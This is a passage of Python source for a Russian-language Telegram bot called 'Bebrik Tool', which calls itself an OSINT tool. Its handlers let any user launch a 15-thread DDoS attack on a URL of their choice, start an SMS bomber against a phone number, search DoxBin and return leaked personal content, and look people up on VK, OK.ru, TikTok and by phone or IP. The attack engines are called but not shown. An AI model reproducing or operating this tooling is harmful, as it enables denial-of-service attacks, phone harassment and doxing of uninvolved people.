        "Для использования Bebrik Tool необходимо подписаться на наш канал.\n\n"
        "После подписки нажмите кнопку <b>\"✅ Я подписался\"</b>",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def cancel_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отмена текущего действия"""
    for key in ['waiting_for_vk', 'waiting_for_ok', 'waiting_for_ddos_target', 'waiting_for_phone', 'waiting_for_ip', 'waiting_for_bomber', 'waiting_for_doxbin', 'waiting_for_tiktok']:
        context.user_data[key] = False
    
    await show_main_menu(update, context)
    await update.message.reply_text("❌ Действие отменено")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Главное меню Bebrik Tool с проверкой подписки и био"""
    user = update.effective_user
    if not user:
        return
    
    user_id = user.id
    username = user.username or "Без username"
    first_name = user.first_name or "Пользователь"
    
    add_user_session(user_id, username, first_name)
    
    for key in ['waiting_for_vk', 'waiting_for_ok', 'waiting_for_ddos_target', 'waiting_for_phone', 'waiting_for_ip', 'waiting_for_bomber', 'waiting_for_doxbin', 'waiting_for_tiktok']:
        context.user_data[key] = False
    
    if not await check_subscription(user_id, context):
        await send_subscription_message(update, context)
        return
    
    if not await check_bio(user_id, context):
        await send_bio_required_message(update, context)
        return
    
    await show_main_menu(update, context)

async def countdown_timer(message, seconds=30, search_type="поиска"):
    """Отсчет времени с обновлением сообщения"""
    for i in range(seconds, 0, -1):
        try:
            await message.edit_text(
                f"⏳ <b>Идет {search_type}...</b>\n\n"
                f"Осталось: <code>{i}</code> секунд\n\n"
                "Пожалуйста, подождите...",
                parse_mode='HTML'
            )
            await asyncio.sleep(1)
        except:
            break

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик кнопок"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    if not user:
        return
    
    user_id = user.id
    update_user_activity(user_id)
    
    if query.data not in ["check_subscription", "check_bio"] and not await check_subscription(user_id, context):
        await send_subscription_message_query(query, context)
        return
    
    if query.data not in ["check_subscription", "check_bio"] and not await check_bio(user_id, context):
        await send_bio_required_message_query(query, context)
        return
    
    if query.data == "check_subscription":
        if await check_subscription(user_id, context):
            if await check_bio(user_id, context):
                await start_from_query(query, context)
            else:
                await send_bio_required_message_query(query, context)
        else:
            await query.edit_message_text(
                "❌ <b>Вы еще не подписались!</b>\n\n"
                "Пожалуйста, подпишитесь на канал и нажмите кнопку снова.",
                parse_mode='HTML'
            )
            await send_subscription_message_query(query, context)
        return
    
    elif query.data == "check_bio":
        if await check_bio(user_id, context):
            if await check_subscription(user_id, context):
                await start_from_query(query, context)
            else:
                await send_subscription_message_query(query, context)
        else:
            await query.edit_message_text(
                "❌ <b>Фраза не найдена в вашем био!</b>\n\n"
                f"Добавьте в описание профиля: <code>{REQUIRED_BIO}</code>\n\n"
                "После добавления нажмите кнопку снова.",
                parse_mode='HTML'
            )
            await send_bio_required_message_query(query, context)
        return
    
    elif query.data == "vk_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔍 <b>Поиск VK пользователя</b>\n\n"
            "Введите VK ID, username или ссылку:\n\n"
            "<b>Примеры:</b>\n"
            "• <code>123456789</code>\n" 
            "• <code>durov</code>\n"
            "• <code>id123456789</code>\n"
            "• <code>https://vk.com/durov</code>\n"
            "• <code>vk.com/id1</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_vk'] = True
        
    elif query.data == "ok_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "👥 <b>Поиск в Одноклассниках</b>\n\n"
            "Введите телефон или email:\n\n"
            "<b>Примеры:</b>\n"
            "• <code>+79123456789</code>\n"
            "• <code>79123456789</code>\n"
            "• <code>example@mail.ru</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_ok'] = True
        
    elif query.data == "phone_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📞 <b>Поиск по номеру/Gmail</b>\n\n"
            "Введите номер телефона или Gmail:\n\n"
            "<b>Примеры:</b>\n"
            "• <code>+79123456789</code>\n"
            "• <code>example@gmail.com</code>\n\n"
            "⚠️ <i>Поиск займет 30 секунд</i>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_phone'] = True
        
    elif query.data == "ip_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🌐 <b>Поиск по IP</b>\n\n"
            "Введите IP-адрес:\n\n"
            "<b>Пример:</b>\n"
            "• <code>8.8.8.8</code>\n"
            "• <code>192.168.1.1</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_ip'] = True
        
    elif query.data == "ddos_menu":
        keyboard = [[InlineKeyboardButton("🎯 Начать атаку", callback_data="start_ddos")]]
        
        if ddos_attacker.active:
            keyboard.append([InlineKeyboardButton("📊 Статистика", callback_data="ddos_stats")])
            keyboard.append([InlineKeyboardButton("🛑 Остановить", callback_data="stop_ddos")])
            
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_text = "🟢 Активна" if ddos_attacker.active else "🔴 Не активна"
        await query.edit_message_text(
            f"⚡ <b>DDoS Меню</b>\n\n"
            f"<b>Bebrik DDoS Attack</b>\n"
            f"• Статус: {status_text}\n"
            f"• Максимум 15 потоков\n"
            f"• Автоматические User-Agents\n\n"
            f"Выберите действие:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
    elif query.data == "start_ddos":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="ddos_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🎯 <b>Запуск DDoS атаки</b>\n\n"
            "Введите URL цели:\n\n"
            "<b>Пример:</b>\n"
            "<code>https://example.com</code>\n"
            "<code>http://target.site</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_ddos_target'] = True
        
    elif query.data == "ddos_stats":
        stats = ddos_attacker.stats
        status = "🟢 Активна" if ddos_attacker.active else "🔴 Остановлена"
        
        message = f"📊 <b>Статистика DDoS</b>\n\n"
        message += f"Статус: {status}\n"
        message += f"Всего запросов: <code>{stats['total_requests']}</code>\n"
        message += f"Успешных: <code>{stats['successful']}</code>\n"
        message += f"Ошибок: <code>{stats['failed']}</code>\n"
        
        if stats['total_requests'] > 0:
            efficiency = (stats['successful'] / stats['total_requests']) * 100
            message += f"Эффективность: <code>{efficiency:.1f}%</code>\n"
        
        if ddos_attacker.active:
            message += f"\n⚡ Атака в процессе...\n"
        
        keyboard = [
            [InlineKeyboardButton("🛑 Остановить", callback_data="stop_ddos")],
            [InlineKeyboardButton("🔙 В меню DDoS", callback_data="ddos_menu")]
        ]
            
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        
    elif query.data == "stop_ddos":
        if ddos_attacker.active:
            stats = ddos_attacker.stop_attack()
            message = f"🛑 <b>DDoS атака остановлена</b>\n\n"
            message += f"<b>Итоговая статистика:</b>\n"
            message += f"• Всего запросов: <code>{stats['total_requests']}</code>\n"
            message += f"• Успешных: <code>{stats['successful']}</code>\n"
            message += f"• Ошибок: <code>{stats['failed']}</code>\n"
            
            if stats['total_requests'] > 0:
                efficiency = (stats['successful'] / stats['total_requests']) * 100
                message += f"• Эффективность: <code>{efficiency:.1f}%</code>\n"
        else:
            message = "ℹ️ <b>Атака не активна</b>\n\nНет запущенных DDoS атак"
        
        keyboard = [[InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        
    # Новые обработчики для бомбера, доксбина и TikTok
    elif query.data == "bomber_menu":
        keyboard = [[InlineKeyboardButton("💣 Запустить бомбер", callback_data="start_bomber")]]
        
        if bomber.active:
            keyboard.append([InlineKeyboardButton("📊 Статистика", callback_data="bomber_stats")])
            keyboard.append([InlineKeyboardButton("🛑 Остановить", callback_data="stop_bomber")])
            
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_text = "🟢 Активен" if bomber.active else "🔴 Не активен"
        await query.edit_message_text(
            f"💣 <b>SMS Бомбер</b>\n\n"
            f"<b>Bebrik SMS Bomber</b>\n"
            f"• Статус: {status_text}\n"
            f"• Циклы по 12 сервисов\n"
            f"• Рандомные User-Agents\n\n"
            f"Выберите действие:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
    elif query.data == "start_bomber":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="bomber_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "💣 <b>Запуск SMS Бомбера</b>\n\n"
            "Введите номер телефона:\n\n"
            "<b>Пример:</b>\n"
            "<code>+79123456789</code>\n"
            "<code>79123456789</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_bomber'] = True
        
    elif query.data == "bomber_stats":
        stats = bomber.stats
        status = "🟢 Активен" if bomber.active else "🔴 Остановлен"
        
        message = f"📊 <b>Статистика Бомбера</b>\n\n"
        message += f"Статус: {status}\n"
        message += f"Всего запросов: <code>{stats['total_requests']}</code>\n"
        message += f"Успешных: <code>{stats['successful']}</code>\n"
        message += f"Ошибок: <code>{stats['failed']}</code>\n"
        
        if stats['total_requests'] > 0:
            efficiency = (stats['successful'] / stats['total_requests']) * 100
            message += f"Эффективность: <code>{efficiency:.1f}%</code>\n"
        
        if bomber.active:
            message += f"\n💣 Бомбардировка в процессе...\n"
        
        keyboard = [
            [InlineKeyboardButton("🛑 Остановить", callback_data="stop_bomber")],
            [InlineKeyboardButton("🔙 В меню Бомбера", callback_data="bomber_menu")]
        ]
            
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        
    elif query.data == "stop_bomber":
        if bomber.active:
            stats = bomber.stop_bombing()
            message = f"🛑 <b>SMS Бомбер остановлен</b>\n\n"
            message += f"<b>Итоговая статистика:</b>\n"
            message += f"• Всего запросов: <code>{stats['total_requests']}</code>\n"
            message += f"• Успешных: <code>{stats['successful']}</code>\n"
            message += f"• Ошибок: <code>{stats['failed']}</code>\n"
            
            if stats['total_requests'] > 0:
                efficiency = (stats['successful'] / stats['total_requests']) * 100
                message += f"• Эффективность: <code>{efficiency:.1f}%</code>\n"
        else:
            message = "ℹ️ <b>Бомбер не активен</b>\n\nНет запущенных атак"
        
        keyboard = [[InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        
    elif query.data == "doxbin_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📁 <b>Поиск в DoxBin</b>\n\n"
            "Введите запрос для поиска:\n\n"
            "<b>Примеры:</b>\n"
            "• <code>+79123456789</code>\n"
            "• <code>username</code>\n"
            "• <code>email@example.com</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_doxbin'] = True
        
    elif query.data == "tiktok_search":
        keyboard = [[InlineKeyboardButton("❌ Отмена", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🎵 <b>Поиск в TikTok</b>\n\n"
            "Введите username пользователя TikTok:\n\n"
            "<b>Пример:</b>\n"
            "• <code>username</code>\n"
            "• <code>user123</code>\n\n"
            "Или нажмите <b>❌ Отмена</b> для возврата в меню",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_tiktok'] = True
        
    elif query.data == "back_to_main":
        await start_from_query(query, context)

async def start_from_query(query, context):
    """Показывает главное меню из query"""
    for key in ['waiting_for_vk', 'waiting_for_ok', 'waiting_for_ddos_target', 'waiting_for_phone', 'waiting_for_ip', 'waiting_for_bomber', 'waiting_for_doxbin', 'waiting_for_tiktok']:
        context.user_data[key] = False
    
    keyboard = [
        [InlineKeyboardButton("🔍 Поиск VK", callback_data="vk_search")],
        [InlineKeyboardButton("👥 Поиск OK.ru", callback_data="ok_search")],
        [InlineKeyboardButton("📞 Поиск по номеру/Gmail", callback_data="phone_search")],
        [InlineKeyboardButton("🌐 Поиск по IP", callback_data="ip_search")],
        [InlineKeyboardButton("🎵 Поиск TikTok", callback_data="tiktok_search")],
        [InlineKeyboardButton("📁 Поиск DoxBin", callback_data="doxbin_search")],
        [InlineKeyboardButton("💣 SMS Бомбер", callback_data="bomber_menu")],
        [InlineKeyboardButton("⚡ DDoS Атака", callback_data="ddos_menu")]
    ]
    
    if ddos_attacker.active:
        keyboard.append([InlineKeyboardButton("📊 Статистика DDoS", callback_data="ddos_stats")])
    
    if bomber.active:
        keyboard.append([InlineKeyboardButton("📊 Статистика Бомбера", callback_data="bomber_stats")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        "🦦 <b>Bebrik Tool</b>\n\n"
        "Многофункциональный инструмент для OSINT\n\n"
        "Выберите действие:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def send_subscription_message_query(query, context):
    """Отправляет сообщение о подписке из query"""
    keyboard = [
        [InlineKeyboardButton("📢 Подписаться на канал", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ Я подписался", callback_data="check_subscription")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "📢 <b>Требуется подписка!</b>\n\n"
        "Для использования Bebrik Tool необходимо подписаться на наш канал.\n\n"
        "После подписки нажмите кнопку <b>\"✅ Я подписался\"</b>",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def send_bio_required_message_query(query, context):
    """Отправляет сообщение о требовании био из query"""
    keyboard = [
        [InlineKeyboardButton("📝 Добавить в био", callback_data="check_bio")],
        [InlineKeyboardButton("✅ Проверить снова", callback_data="check_bio")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📝 <b>Требуется добавить в описание профиля!</b>\n\n"
        f"Для использования Bebrik Tool добавьте в ваше Telegram био:\n\n"
        f"<code>{REQUIRED_BIO}</code>\n\n"
        f"<b>Как добавить:</b>\n"
        f"1. Откройте настройки Telegram\n"
        f"2. Нажмите 'Изменить профиль'\n"
        f"3. В поле 'Био' добавьте текст\n"
        f"4. Сохраните изменения\n\n"
        f"После добавления нажмите кнопку ниже:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик сообщений с проверкой подписки"""
    user = update.effective_user
    if not user:
        return
    
    user_id = user.id
    update_user_activity(user_id)
    
    if not await check_subscription(user_id, context):
        await send_subscription_message(update, context)
        return
    
    if not await check_bio(user_id, context):
        await send_bio_required_message(update, context)
        return
    
    text = update.message.text.strip()
    
    if text.lower() in ['отмена', 'cancel', 'стоп', 'stop', 'назад', 'back']:
        await cancel_action(update, context)
        return
    
    if context.user_data.get('waiting_for_vk'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        user_info = get_vk_user_info(text)
        
        if user_info is None:
            await update.message.reply_text("❌ <b>Пользователь не найден или ошибка запроса</b>", parse_mode='HTML')
        elif user_info == "deactivated":
            await update.message.reply_text("❌ <b>Профиль удален или заблокирован</b>", parse_mode='HTML')
        else:
            formatted_info = format_vk_info(user_info)
            await update.message.reply_text(formatted_info, parse_mode='HTML')
        
        context.user_data['waiting_for_vk'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_ok'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        ok_info = check_ok_account(text)
        formatted_info = format_ok_info(text, ok_info)
        await update.message.reply_text(formatted_info, parse_mode='HTML')
        
        context.user_data['waiting_for_ok'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_phone'):
        search_msg = await update.message.reply_text(
            "⏳ <b>Начинаем поиск...</b>\n\n"
            "Осталось: <code>30</code> секунд\n\n"
            "Пожалуйста, подождите...",
            parse_mode='HTML'
        )
        
        await countdown_timer(search_msg, 30, "поиск по номеру/Gmail")
        
        result = await search_phonebook_combined(text)
        
        await search_msg.edit_text(result, parse_mode='HTML')
        
        context.user_data['waiting_for_phone'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_ip'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        ip_info = search_ip(text)
        formatted_info = format_ip_info(ip_info)
        await update.message.reply_text(formatted_info, parse_mode='HTML')
        
        context.user_data['waiting_for_ip'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_ddos_target'):
        if not text.startswith(('http://', 'https://')):
            text = 'http://' + text
            
        ddos_attacker.start_attack(text, threads=15)
        
        await update.message.reply_text(
            f"🎯 <b>DDoS атака запущена!</b>\n\n"
            f"Цель: <code>{text}</code>\n"
            f"Потоков: <code>15</code>\n"
            f"Статус: <code>🟢 Активна</code>\n\n"
            f"Теперь в главном меню доступны кнопки управления атакой",
            parse_mode='HTML'
        )
        
        context.user_data['waiting_for_ddos_target'] = False
        await show_main_menu(update, context)
    
    # Новые обработчики для бомбера, доксбина и TikTok
    elif context.user_data.get('waiting_for_bomber'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        # Очищаем номер от лишних символов
        clean_phone = re.sub(r'[^\d+]', '', text)
        if not clean_phone.startswith('+'):
            clean_phone = '+' + clean_phone
            
        bomber.start_bombing(clean_phone, cycles=3)
        
        await update.message.reply_text(
            f"💣 <b>SMS Бомбер запущен!</b>\n\n"
            f"Цель: <code>{clean_phone}</code>\n"
            f"Циклы: <code>3</code>\n"
            f"Сервисов за цикл: <code>12</code>\n"
            f"Статус: <code>🟢 Активен</code>\n\n"
            f"Теперь в главном меню доступны кнопки управления бомбером",
            parse_mode='HTML'
        )
        
        context.user_data['waiting_for_bomber'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_doxbin'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        search_msg = await update.message.reply_text(
            "⏳ <b>Ищем в DoxBin...</b>\n\n"
            "Пожалуйста, подождите...",
            parse_mode='HTML'
        )
        
        links, error = search_doxbin(text)
        
        if error:
            await search_msg.edit_text(f"❌ <b>Ошибка поиска в DoxBin:</b>\n\n{error}", parse_mode='HTML')
        elif not links:
            await search_msg.edit_text(f"🔍 <b>Поиск в DoxBin</b>\n\nНичего не найдено для: <code>{text}</code>", parse_mode='HTML')
        else:
            message = f"📁 <b>Результаты поиска в DoxBin</b>\n\n"
            message += f"Запрос: <code>{text}</code>\n"
            message += f"Найдено результатов: <code>{len(links)}</code>\n\n"
            
            for i, link in enumerate(links[:5], 1):  # Показываем первые 5 результатов
                message += f"<b>{i}. {link['title']}</b>\n"
                message += f"<code>{link['url']}</code>\n\n"
                
                # Получаем содержимое для первого результата
                if i == 1:
                    content = fetch_doxbin_content(link)
                    if len(content) > 500:
                        content = content[:500] + "..."
                    message += f"<b>Содержимое:</b>\n<code>{content}</code>\n\n"
            
            if len(links) > 5:
                message += f"<i>... и еще {len(links) - 5} результатов</i>\n"
                
            await search_msg.edit_text(message, parse_mode='HTML')
        
        context.user_data['waiting_for_doxbin'] = False
        await show_main_menu(update, context)
        
    elif context.user_data.get('waiting_for_tiktok'):
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
        
        search_msg = await update.message.reply_text(
            "⏳ <b>Ищем в TikTok...</b>\n\n"
            "Пожалуйста, подождите...",
            parse_mode='HTML'
        )
        
        user_info, error = get_tiktok_info(text)
        
        if error:
            await search_msg.edit_text(f"❌ <b>Ошибка поиска в TikTok:</b>\n\n{error}", parse_mode='HTML')
        elif user_info:
            formatted_info = format_tiktok_info(user_info)
            await search_msg.edit_text(formatted_info, parse_mode='HTML')
        else:
            await search_msg.edit_text(f"❌ <b>Пользователь TikTok не найден:</b>\n\n<code>{text}</code>", parse_mode='HTML')
        
        context.user_data['waiting_for_tiktok'] = False
        await show_main_menu(update, context)
    
    else:
        await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать главное меню"""
    keyboard = [
        [InlineKeyboardButton("🔍 Поиск VK", callback_data="vk_search")],
        [InlineKeyboardButton("👥 Поиск OK.ru", callback_data="ok_search")],
        [InlineKeyboardButton("📞 Поиск по номеру/Gmail", callback_data="phone_search")],
        [InlineKeyboardButton("🌐 Поиск по IP", callback_data="ip_search")],
        [InlineKeyboardButton("🎵 Поиск TikTok", callback_data="tiktok_search")],
        [InlineKeyboardButton("📁 Поиск DoxBin", callback_data="doxbin_search")],
        [InlineKeyboardButton("💣 SMS Бомбер", callback_data="bomber_menu")],
        [InlineKeyboardButton("⚡ DDoS Атака", callback_data="ddos_menu")]
    ]
    
    if ddos_attacker.active:
        keyboard.append([InlineKeyboardButton("📊 Статистика DDoS", callback_data="ddos_stats")])
    
    if bomber.active:
        keyboard.append([InlineKeyboardButton("📊 Статистика Бомбера", callback_data="bomber_stats")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message') and update.message:
        await update.message.reply_text(
            "🦦 <b>Bebrik Tool</b>\n\n"
            "Многофункциональный инструмент для OSINT\n\n"
            "Выберите действие:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    elif hasattr(update, 'callback_query') and update.callback_query:
        await update.callback_query.message.reply_text(
            "🦦 <b>Bebrik Tool</b>\n\n"
            "Многофункциональный инструмент для OSINT\n\n"
            "Выберите действие:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="🦦 <b>Bebrik Tool</b>\n\n"
                 "Многофункциональный инструмент для OSINT\n\n"
                 "Выберите действие:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )

def main():
    """Запуск бота"""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler("cancel", cancel_action))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🦦 Bebrik Tool запущен...")
    print("Бот готов к работе!")
    
    stats = get_user_stats()
    print(f"📊 Всего пользователей: {stats['total_users']}")
    print(f"📈 Активных сегодня: {stats['active_today']}")
    print(f"💾 Сессии сохраняются в: {SESSIONS_FILE}")
    
    application.run_polling()

if __name__ == "__main__":
    main()
